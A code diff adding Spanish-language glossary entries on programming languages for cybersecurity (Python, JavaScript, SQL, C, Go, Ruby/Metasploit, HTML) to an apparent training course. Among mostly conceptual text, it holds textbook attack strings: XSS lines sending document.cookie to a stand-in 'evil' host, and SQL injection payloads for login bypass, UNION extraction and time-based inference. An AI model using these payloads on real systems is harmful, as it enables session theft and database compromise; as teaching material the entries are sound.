@@ -3720,6 +3720,513 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Portfolio y carrera", "Auditoría end-to-end", "Reporte profesional"],
   },
+
+  // ── M51 · Python para Ciberseguridad ─────────────────────────────────────
+  {
+    id: 540,
+    module: 51,
+    term: "Python en seguridad",
+    short: "El lenguaje de facto del hacking: simple, con un ecosistema enorme y prototipado rápido.",
+    detail:
+      "**Python** domina la ciberseguridad por su **sintaxis legible**, su **enorme ecosistema** de librerías y la rapidez para **prototipar herramientas**. Se usa en pentesting, análisis de malware, forense, automatización y exploit development.\n" +
+      "> 💡 La mayoría de las herramientas ofensivas modernas (o sus PoCs) están escritas en Python.",
+    examples: [
+      "Un escáner de puertos en 10 líneas con sockets.",
+      "Automatizar el parseo de la salida de nmap.",
+    ],
+    related: ["Sockets y networking", "Scapy y requests", "Automatización de pentesting"],
+  },
+  {
+    id: 541,
+    module: 51,
+    term: "Sockets y networking",
+    short: "La librería socket permite hablar TCP/UDP directamente: la base de las herramientas de red.",
+    detail:
+      "El módulo **`socket`** da control de bajo nivel sobre conexiones TCP/UDP, base de escáneres y clientes/servidores. `connect_ex` devuelve 0 si el puerto está abierto.\n" +
+      "import socket\n" +
+      "def open(ip, port):\n" +
+      "    s = socket.socket(); s.settimeout(1)\n" +
+      "    r = s.connect_ex((ip, port)); s.close()\n" +
+      "    return r == 0",
+    examples: [
+      "Un port scanner que recorre range(1, 1025).",
+      "Un cliente que envía un banner-grab a un servicio.",
+    ],
+    related: ["Python en seguridad", "Scapy y requests", "Tipos de escaneo Nmap"],
+  },
+  {
+    id: 542,
+    module: 51,
+    term: "Scapy y requests",
+    short: "Dos librerías estrella: crafting de paquetes (Scapy) y HTTP de alto nivel (requests).",
+    detail:
+      "• **Scapy** — crea, envía y diseca **paquetes** a voluntad (escaneos custom, spoofing, sniffing).\n" +
+      "• **requests** — cliente **HTTP** sencillo para interactuar con webs/APIs (fuzzing, scraping, auth).\n" +
+      "from scapy.all import IP, TCP, sr1\n" +
+      "ans = sr1(IP(dst='10.0.0.5')/TCP(dport=80, flags='S'), timeout=1)",
+    examples: [
+      "Un SYN scan con Scapy sin depender de nmap.",
+      "requests.get(url) para inspeccionar headers de respuesta.",
+    ],
+    related: ["Sockets y networking", "Librerías clave de seguridad", "Análisis de PCAP"],
+  },
+  {
+    id: 543,
+    module: 51,
+    term: "Librerías clave de seguridad",
+    short: "El ecosistema que convierte a Python en una navaja suiza ofensiva y defensiva.",
+    detail:
+      "| Librería | Uso |\n" +
+      "|---|---|\n" +
+      "| impacket | Protocolos Windows (SMB, NTLM, Kerberos) |\n" +
+      "| paramiko | Cliente SSH |\n" +
+      "| pwntools | Exploit development (CTF/pwn) |\n" +
+      "| pycryptodome | Cifrado |\n" +
+      "| yara-python | Detección de malware |\n" +
+      "| volatility3 | Forense de memoria |\n" +
+      "> 💡 `impacket` y `pwntools` son omnipresentes en pentesting de AD y en exploiting.",
+    examples: [
+      "impacket para un psexec.py con un hash robado.",
+      "pwntools para automatizar la explotación de un binario.",
+    ],
+    related: ["Scapy y requests", "Automatización de pentesting", "Movimiento lateral"],
+  },
+  {
+    id: 544,
+    module: 51,
+    term: "Automatización de pentesting",
+    short: "Encadenar escaneo, parseo y explotación en scripts repetibles.",
+    detail:
+      "El valor de Python en pentest es **automatizar lo tedioso**: lanzar herramientas, **parsear** su salida, correlacionar y disparar el siguiente paso. Convierte un flujo manual de horas en un comando reproducible.\n" +
+      "> 💡 Automatizar también reduce errores y hace el trabajo auditable y repetible.",
+    examples: [
+      "Un script que corre nmap, extrae puertos abiertos y lanza enumeración.",
+      "Orquestar una cadena recon → escaneo → reporte.",
+    ],
+    related: ["Python en seguridad", "Librerías clave de seguridad", "Metodología de un pentest"],
+  },
+
+  // ── M52 · Python Avanzado para Seguridad ─────────────────────────────────
+  {
+    id: 550,
+    module: 52,
+    term: "Regex y parsing de logs",
+    short: "Las expresiones regulares extraen información estructurada de texto desordenado.",
+    detail:
+      "Gran parte del trabajo de seguridad es **procesar logs**. Las **expresiones regulares** (`re`) extraen IPs, fechas, errores y patrones de millones de líneas.\n" +
+      "import re\n" +
+      "ips = re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', open('auth.log').read())\n" +
+      "> 💡 Combinado con `collections.Counter`, en pocas líneas se obtiene el top de IPs atacantes.",
+    examples: [
+      "Extraer todas las IPs de logins fallidos de un log.",
+      "Parsear timestamps para construir una timeline.",
+    ],
+    related: ["El trío grep / awk / sed", "APIs de threat intel", "Tool building en Python"],
+  },
+  {
+    id: 551,
+    module: 52,
+    term: "cryptography en Python",
+    short: "Implementar y romper cifrado con librerías como cryptography y pycryptodome.",
+    detail:
+      "Las librerías **`cryptography`** y **`pycryptodome`** dan primitivas listas (AES, RSA, hashing, HMAC) para herramientas defensivas y para retos de cripto en CTF. Evitan el antipatrón de 'rodar tu propia cripto'.\n" +
+      "> ⚠️ Usar las primitivas de alto nivel (Fernet) en vez de ensamblar AES a mano reduce errores fatales (IV reuse, padding).",
+    examples: [
+      "Cifrar un archivo de configuración con Fernet.",
+      "Resolver un reto de cripto descifrando con una clave hallada.",
+    ],
+    related: ["Cifrado simétrico", "Tool building en Python", "Regex y parsing de logs"],
+  },
+  {
+    id: 552,
+    module: 52,
+    term: "APIs de threat intel",
+    short: "Automatizar consultas a servicios como VirusTotal y Shodan enriquece el análisis.",
+    detail:
+      "Python consume **APIs** de inteligencia para enriquecer indicadores: **VirusTotal** (reputación de hashes/URLs), **Shodan** (hosts expuestos), AbuseIPDB. Permite enriquecer una alerta o un IoC de forma masiva y automática.\n" +
+      "import requests\n" +
+      "r = requests.get(f'https://www.virustotal.com/api/v3/files/{h}', headers={'x-apikey': KEY})",
+    examples: [
+      "Consultar VirusTotal por el hash de una muestra.",
+      "Buscar en Shodan los servidores de una organización.",
+    ],
+    related: ["Threat intelligence", "Shodan y Censys", "Tool building en Python"],
+  },
+  {
+    id: 553,
+    module: 52,
+    term: "Tool building en Python",
+    short: "Convertir un script en una herramienta usable: argumentos, estructura y manejo de errores.",
+    detail:
+      "Una herramienta seria va más allá del script: **`argparse`** para argumentos CLI, estructura en funciones/módulos, manejo de errores y salida clara. Así la usan otros y se integra en pipelines.\n" +
+      "import argparse\n" +
+      "p = argparse.ArgumentParser(); p.add_argument('-t', '--target')",
+    examples: [
+      "Una CLI con --target y --ports y ayuda automática.",
+      "Empaquetar la herramienta para distribuirla (pip).",
+    ],
+    related: ["Regex y parsing de logs", "APIs de threat intel", "Automatización de pentesting"],
+  },
+
+  // ── M53 · JavaScript y Seguridad Web ─────────────────────────────────────
+  {
+    id: 560,
+    module: 53,
+    term: "Fundamentos de JavaScript",
+    short: "El lenguaje del navegador: entenderlo es clave para atacar y defender la web.",
+    detail:
+      "**JavaScript** corre en el navegador de cada usuario, por lo que es el medio de los ataques **del lado del cliente** (XSS, clickjacking). Entender su sintaxis, el event loop y el DOM es imprescindible tanto para el atacante como para auditar código frontend.",
+    examples: [
+      "Leer y entender el JS de una SPA para hallar endpoints ocultos.",
+      "Auditar una función de sanitización del lado del cliente.",
+    ],
+    related: ["DOM manipulation", "XSS desde el atacante", "Node.js security"],
+  },
+  {
+    id: 561,
+    module: 53,
+    term: "DOM manipulation",
+    short: "El JS puede leer y modificar la página viva — incluidas las cookies y el contenido.",
+    detail:
+      "El **DOM** es la representación viva de la página. JavaScript puede **leerlo y modificarlo**: cambiar contenido, leer `document.cookie`, redirigir. Es justo lo que abusa un XSS para robar sesión o alterar la página.\n" +
+      "document.location = 'http://evil.com?c=' + document.cookie\n" +
+      "> ⚠️ Por eso las cookies de sesión deben ser **HttpOnly**: inaccesibles desde el DOM.",
+    examples: [
+      "Un payload que exfiltra document.cookie a un servidor del atacante.",
+      "Modificar el DOM para insertar un formulario de login falso.",
+    ],
+    related: ["Fundamentos de JavaScript", "XSS desde el atacante", "Cookie security"],
+  },
+  {
+    id: 562,
+    module: 53,
+    term: "XSS desde el atacante",
+    short: "Ver el XSS desde la ofensiva: qué se puede lograr inyectando JavaScript.",
+    detail:
+      "Desde la perspectiva ofensiva, un **XSS** ejecuta JS en el contexto de la víctima: **robo de sesión**, keylogging, acciones en su nombre, o un BeEF hook para controlar el navegador. La gravedad depende de qué pueda hacer ese usuario.\n" +
+      "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
+    examples: [
+      "Stored XSS en un comentario que roba la sesión de quien lo lee.",
+      "Encadenar XSS + CSRF para acciones privilegiadas.",
+    ],
+    related: ["Cross-Site Scripting (XSS)", "DOM manipulation", "Prevención de inyección"],
+  },
+  {
+    id: 563,
+    module: 53,
+    term: "Node.js security",
+    short: "JS también corre en el servidor: nuevos riesgos (inyección de comandos, deps).",
+    detail:
+      "Con **Node.js**, JavaScript corre en el **servidor**, con sus propios riesgos: **inyección de comandos** (`child_process`), **prototype pollution**, deserialización insegura y un árbol de **dependencias npm** enorme (supply chain). El `npm audit` y evitar `eval`/`exec` con entrada de usuario son básicos.\n" +
+      "> ⚠️ Pasar entrada de usuario a `child_process.exec` es RCE directo.",
+    examples: [
+      "Una API Node vulnerable a inyección de comandos por exec.",
+      "Una dependencia npm comprometida (supply chain).",
+    ],
+    related: ["Fundamentos de JavaScript", "Dependency scanning (SCA)", "Injection"],
+  },
+
+  // ── M54 · SQL y Seguridad de Bases de Datos ──────────────────────────────
+  {
+    id: 570,
+    module: 54,
+    term: "Fundamentos de SQL",
+    short: "El lenguaje de las bases de datos relacionales: saberlo es requisito para atacarlas y protegerlas.",
+    detail:
+      "**SQL** consulta y manipula bases de datos relacionales (`SELECT`, `INSERT`, `WHERE`, `UNION`, `JOIN`). Entender cómo se construye una consulta es lo que permite ver **dónde** la entrada del usuario puede romperla (inyección).\n" +
+      "SELECT * FROM users WHERE user = 'alice' AND pass = '...';",
+    examples: [
+      "Una consulta de login que concatena usuario y contraseña.",
+      "Un UNION SELECT para combinar resultados de otra tabla.",
+    ],
+    related: ["SQL Injection manual", "Blind y time-based SQLi", "Database hardening"],
+  },
+  {
+    id: 571,
+    module: 54,
+    term: "SQL Injection manual",
+    short: "Inyectar SQL a mano para entender qué hace cada payload, no solo lanzar sqlmap.",
+    detail:
+      "Explotar **a mano** enseña la mecánica: romper la consulta con una comilla, comentar el resto, y usar **UNION** para extraer datos.\n" +
+      "' OR 1=1 -- \n" +
+      "' UNION SELECT username, password FROM users -- \n" +
+      "> 💡 Dominar el SQLi manual permite hacer **WAF bypass** donde las herramientas automáticas fallan.",
+    examples: [
+      "Saltarse un login con ' OR 1=1 --.",
+      "Extraer columnas con ORDER BY y luego UNION SELECT.",
+    ],
+    related: ["SQL Injection", "Blind y time-based SQLi", "Fundamentos de SQL"],
+  },
+  {
+    id: 572,
+    module: 54,
+    term: "Blind y time-based SQLi",
+    short: "Cuando no se ven los datos, se infieren por respuestas booleanas o por tiempo.",
+    detail:
+      "Si la app no muestra el resultado, el SQLi es **a ciegas**:\n" +
+      "• **Booleano** — la página cambia según si la condición es verdadera o falsa.\n" +
+      "• **Time-based** — se fuerza un retardo y se mide el tiempo de respuesta.\n" +
+      "' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0) -- \n" +
+      "> 💡 Es lento (bit a bit), por eso se automatiza, pero entender la lógica es clave.",
+    examples: [
+      "Inferir la versión de la BD carácter a carácter por tiempo.",
+      "Un blind booleano que revela datos por diferencias en la página.",
+    ],
+    related: ["SQL Injection manual", "SQL Injection", "Herramientas: sqlmap"],
+  },
+  {
+    id: 573,
+    module: 54,
+    term: "Database hardening",
+    short: "Endurecer la base de datos para limitar el daño aunque haya inyección.",
+    detail:
+      "Defensa en capas para bases de datos:\n" +
+      "• **Consultas parametrizadas** — la cura raíz del SQLi.\n" +
+      "• **Mínimo privilegio** — la cuenta de la app no debe ser admin de la BD.\n" +
+      "• **Cifrado** en reposo y en tránsito; **segmentar** la BD en red privada.\n" +
+      "• **Auditoría** de accesos y consultas anómalas.\n" +
+      "> 💡 Con mínimo privilegio, un SQLi exitoso causa mucho menos daño.",
+    examples: [
+      "La app conecta con un usuario que solo puede SELECT/INSERT lo necesario.",
+      "Base de datos en subred privada, sin exposición a Internet.",
+    ],
+    related: ["Prevención de inyección", "Mínimo privilegio", "DMZ y segmentación de red"],
+  },
+
+  // ── M55 · C/C++ y Low-Level Security ─────────────────────────────────────
+  {
+    id: 580,
+    module: 55,
+    term: "Fundamentos de C",
+    short: "El lenguaje de los sistemas: potente, cercano al hardware y sin red de seguridad.",
+    detail:
+      "**C** es la base de SOs, drivers y software de bajo nivel. Da control directo de la memoria mediante **punteros**, pero **no protege** contra accesos inválidos: ahí nacen las vulnerabilidades de memoria (overflows, use-after-free) que dominan el exploiting.\n" +
+      "> 💡 Leer C es imprescindible para auditar software de sistemas y entender exploits.",
+    examples: [
+      "Un puntero que accede fuera de los límites de un array.",
+      "Auditar código C en busca de funciones inseguras (strcpy, gets).",
+    ],
+    related: ["Gestión de memoria", "Buffer overflow", "Shellcode básico"],
+  },
+  {
+    id: 581,
+    module: 55,
+    term: "Gestión de memoria",
+    short: "Stack y heap: dónde viven los datos y por qué importa para la seguridad.",
+    detail:
+      "La memoria de un proceso se divide en regiones; las dos clave para el exploiting:\n" +
+      "| Región | Contiene |\n" +
+      "|---|---|\n" +
+      "| Stack | Variables locales, dirección de retorno |\n" +
+      "| Heap | Memoria dinámica (malloc/free) |\n" +
+      "En C **tú gestionas** la memoria: errores como liberar dos veces (double free), usar tras liberar (**use-after-free**) o escribir de más (**overflow**) son explotables.\n" +
+      "> ⚠️ La dirección de retorno guardada en el stack es el objetivo clásico de un buffer overflow.",
+    examples: [
+      "Un use-after-free al usar un puntero ya liberado.",
+      "Una variable local desbordada que pisa la dirección de retorno.",
+    ],
+    related: ["Fundamentos de C", "Buffer overflow", "Shellcode básico"],
+  },
+  {
+    id: 582,
+    module: 55,
+    term: "Buffer overflow",
+    short: "Escribir más datos de los que cabe en un buffer corrompe la memoria adyacente.",
+    detail:
+      "Un **buffer overflow** ocurre cuando se escriben **más bytes de los que el buffer admite**, sobrescribiendo memoria contigua. En el stack, eso puede pisar la **dirección de retorno** y **redirigir la ejecución** al código del atacante.\n" +
+      "char buf[64]; strcpy(buf, input); // si input > 64 → overflow\n" +
+      "> 💡 Mitigaciones modernas: **stack canary**, **ASLR**, **DEP/NX**. Ver el diagrama 'Anatomía de un buffer overflow'.",
+    examples: [
+      "strcpy de una entrada larga que sobrescribe el saved EIP.",
+      "Un gets() clásico explotable en un binario de CTF.",
+    ],
+    related: ["Gestión de memoria", "Shellcode básico", "Exploit y Payload"],
+  },
+  {
+    id: 583,
+    module: 55,
+    term: "Shellcode básico",
+    short: "El código máquina que se ejecuta tras tomar control del flujo de un programa.",
+    detail:
+      "El **shellcode** es un pequeño bloque de **código máquina** (a menudo lanza una shell, `/bin/sh`) que se inyecta y se ejecuta al **redirigir la ejecución** con un overflow. Debe ser **independiente de posición** y a veces evitar **bytes nulos**. `msfvenom` o `pwntools` lo generan.\n" +
+      "> ⚠️ Con DEP/NX el stack no es ejecutable, así que el shellcode directo se sustituye por **ROP**.",
+    examples: [
+      "Un shellcode execve('/bin/sh') inyectado tras el overflow.",
+      "Generar shellcode con pwntools para un exploit.",
+    ],
+    related: ["Buffer overflow", "Gestión de memoria", "msfvenom"],
+  },
+
+  // ── M56 · Go para Security Tools ─────────────────────────────────────────
+  {
+    id: 590,
+    module: 56,
+    term: "Fundamentos de Go",
+    short: "Compilado, multiplataforma y de binario único: ideal para herramientas portables.",
+    detail:
+      "**Go** compila a un **binario único sin dependencias**, multiplataforma (cross-compile trivial) y rápido. Por eso es el lenguaje preferido para **herramientas ofensivas modernas** que deben correr en cualquier host sin instalar nada.\n" +
+      "> 💡 Un `GOOS=windows go build` produce un .exe portable desde Linux.",
+    examples: [
+      "Compilar una herramienta para Windows, Linux y macOS de una vez.",
+      "Un implante de un solo binario sin runtime que instalar.",
+    ],
+    related: ["Concurrencia y goroutines", "Network tools en Go", "Túneles con chisel y ligolo"],
+  },
+  {
+    id: 591,
+    module: 56,
+    term: "Concurrencia y goroutines",
+    short: "Las goroutines hacen trivial la concurrencia masiva: escaneos ultrarrápidos.",
+    detail:
+      "Las **goroutines** son hilos ligerísimos: lanzar miles es barato. Combinadas con **canales**, hacen que Go destaque en tareas **concurrentes** como escanear miles de puertos/hosts en paralelo a gran velocidad.\n" +
+      "go scan(host, port) // lanza una goroutine\n" +
+      "> 💡 Por esto muchos escáneres modernos (httpx, naabu) están en Go.",
+    examples: [
+      "Un port scanner concurrente que barre /16 en segundos.",
+      "Procesar miles de URLs en paralelo con un pool de workers.",
+    ],
+    related: ["Fundamentos de Go", "Network tools en Go", "Tipos de escaneo Nmap"],
+  },
+  {
+    id: 592,
+    module: 56,
+    term: "Network tools en Go",
+    short: "La librería estándar de red de Go es robusta y suficiente para casi todo.",
+    detail:
+      "La **stdlib** de Go (`net`, `net/http`, `crypto/tls`) cubre TCP/UDP, HTTP y TLS sin dependencias externas. Eso, con la concurrencia y el binario único, hace de Go la base de muchas herramientas de recon y red de la comunidad (proyectos de ProjectDiscovery).",
+    examples: [
+      "Un cliente HTTP concurrente para fuzzing de directorios.",
+      "Un pequeño proxy/redirector escrito con net.",
+    ],
+    related: ["Concurrencia y goroutines", "Túneles con chisel y ligolo", "Fundamentos de Go"],
+  },
+  {
+    id: 593,
+    module: 56,
+    term: "Por qué Go en tooling (chisel/ligolo)",
+    short: "Binario portable + concurrencia explica por qué el tooling de pivoting moderno es Go.",
+    detail:
+      "Herramientas de **pivoting** como **chisel** y **ligolo-ng** están en Go precisamente por sus ventajas: un **binario único** que se sube a la víctima sin dependencias, **cross-compilation** para cualquier objetivo y **concurrencia** para manejar múltiples túneles. Es el sweet spot del tooling ofensivo actual.",
+    examples: [
+      "Subir el binario Go de chisel a un host Windows comprometido.",
+      "ligolo-ng (Go) creando una interfaz hacia la red interna.",
+    ],
+    related: ["Network tools en Go", "Túneles con chisel y ligolo", "Fundamentos de Go"],
+  },
+
+  // ── M57 · Ruby y Metasploit Development ──────────────────────────────────
+  {
+    id: 600,
+    module: 57,
+    term: "Fundamentos de Ruby",
+    short: "El lenguaje de Metasploit: dinámico, expresivo y orientado a objetos.",
+    detail:
+      "**Ruby** es el lenguaje en el que está escrito **Metasploit Framework**. Es dinámico y muy expresivo, lo que facilita escribir y modificar **módulos** del framework. Saber Ruby es lo que permite ir más allá de *usar* Metasploit a **extenderlo**.",
+    examples: [
+      "Modificar un módulo existente de MSF para un caso propio.",
+      "Entender el código de un exploit de Metasploit.",
+    ],
+    related: ["Estructura de un módulo MSF", "Exploits custom en MSF", "Arquitectura de Metasploit"],
+  },
+  {
+    id: 601,
+    module: 57,
+    term: "Estructura de un módulo MSF",
+    short: "Cada módulo de Metasploit sigue una plantilla: metadatos, opciones y la lógica.",
+    detail:
+      "Un **módulo MSF** es una clase Ruby con partes bien definidas: `initialize` (**metadatos**: nombre, autor, referencias), `register_options` (RHOSTS, RPORT…), y el método principal (`exploit` o `run`). Heredar de la clase adecuada da gratis todo el plumbing del framework.\n" +
+      "> 💡 Ver el diagrama 'Estructura de un módulo de Metasploit' con el flujo de desarrollo.",
+    examples: [
+      "Un módulo auxiliary con register_options y run.",
+      "Un exploit que define check y exploit.",
+    ],
+    related: ["Fundamentos de Ruby", "Exploits custom en MSF", "Auxiliares y post-explotación"],
+  },
+  {
+    id: 602,
+    module: 57,
+    term: "Exploits custom en MSF",
+    short: "Escribir un exploit propio dentro del framework para reutilizar payloads y handlers.",
+    detail:
+      "Desarrollar un **exploit custom** en MSF aprovecha toda la maquinaria: catálogo de **payloads**, **encoders**, manejo de sesiones y **handlers** automáticos. En vez de un PoC suelto, se obtiene un exploit integrado, con `check` para verificar vulnerabilidad y `targets` para distintas versiones.",
+    examples: [
+      "Portar un PoC de un overflow a un módulo exploit de MSF.",
+      "Definir varios targets con offsets distintos por versión.",
+    ],
+    related: ["Estructura de un módulo MSF", "Payloads y Meterpreter", "Buffer overflow"],
+  },
+  {
+    id: 603,
+    module: 57,
+    term: "Auxiliares y post-explotación",
+    short: "No todo es explotar: módulos auxiliary (escaneo/fuzzing) y post (tras el acceso).",
+    detail:
+      "Además de exploits, MSF tiene:\n" +
+      "• **Auxiliary** — escáneres, fuzzers, brute forcers (sin payload).\n" +
+      "• **Post** — módulos que corren **tras** obtener una sesión: recolectar credenciales, pivotar, persistencia.\n" +
+      "Saber escribirlos automatiza fases enteras de un engagement.",
+    examples: [
+      "Un módulo auxiliary de brute force SSH.",
+      "Un módulo post que vuelca hashes de la máquina comprometida.",
+    ],
+    related: ["Estructura de un módulo MSF", "Post-explotación", "Exploits custom en MSF"],
+  },
+
+  // ── M58 · HTML/CSS y Seguridad Frontend ──────────────────────────────────
+  {
+    id: 610,
+    module: 58,
+    term: "Estructura HTML",
+    short: "El esqueleto de toda página web: entenderlo es la base del análisis frontend.",
+    detail:
+      "**HTML** define la estructura de la página con etiquetas y atributos. Conocerla permite **inspeccionar** una web (DevTools), entender cómo se inyecta un XSS (qué contexto: atributo, etiqueta, script) y reconocer elementos sospechosos (iframes ocultos, formularios que apuntan fuera).",
+    examples: [
+      "Inspeccionar el DOM con las DevTools del navegador.",
+      "Detectar un iframe invisible usado para clickjacking.",
+    ],
+    related: ["Formularios e inputs", "Detección de páginas de phishing", "Fundamentos de JavaScript"],
+  },
+  {
+    id: 611,
+    module: 58,
+    term: "Formularios e inputs",
+    short: "Los formularios son la principal vía de entrada de datos — y de ataques.",
+    detail:
+      "Los **`<form>`** e **`<input>`** recogen datos del usuario y son la puerta de la mayoría de los ataques web (inyección, XSS, CSRF). El atributo **`action`** indica adónde van los datos: si apunta a un dominio externo, es señal de phishing/exfiltración.",
+    examples: [
+      "Un formulario de login cuyo action apunta a otro dominio.",
+      "Inputs sin restricción que permiten inyectar payloads.",
+    ],
+    related: ["Estructura HTML", "Validación client-side y sus límites", "Cross-Site Request Forgery (CSRF)"],
+  },
+  {
+    id: 612,
+    module: 58,
+    term: "Validación client-side y sus límites",
+    short: "La validación en el navegador mejora la UX, pero el atacante la salta a voluntad.",
+    detail:
+      "La **validación del lado del cliente** (HTML5 `required`, JS) es **solo para la experiencia de usuario**: el atacante controla su navegador y puede **saltársela** (editar el DOM, mandar la petición directa con Burp/curl).\n" +
+      "> ⚠️ Regla de oro: **toda validación se repite en el servidor**. El cliente nunca es de confianza.",
+    examples: [
+      "Quitar el atributo 'maxlength' por DevTools y enviar más datos.",
+      "Mandar la petición con curl saltándose la validación JS.",
+    ],
+    related: ["Formularios e inputs", "Prevención de inyección", "Node.js security"],
+  },
+  {
+    id: 613,
+    module: 58,
+    term: "Detección de páginas de phishing",
+    short: "Reconocer las señales en el HTML/CSS de un sitio que suplanta a otro.",
+    detail:
+      "Analizar el frontend de un sitio sospechoso revela el phishing: **formularios** que envían a un dominio distinto, **recursos** (logos, CSS) cargados del sitio legítimo, dominios **lookalike**, y JS que captura credenciales. Es útil para triage de URLs reportadas.\n" +
+      "> 💡 Un kit de phishing suele clonar el HTML de la víctima pero cambiar el `action` del formulario.",
+    examples: [
+      "Un clon de un portal bancario con el action apuntando al atacante.",
+      "CSS y logos cargados directamente del banco real (hotlinking).",
+    ],
+    related: ["Estructura HTML", "Formularios e inputs", "Evasión de filtros"],
+  },
 ];
 
 export function definitionsByModule(moduleId: number): ConceptDefinition[] {
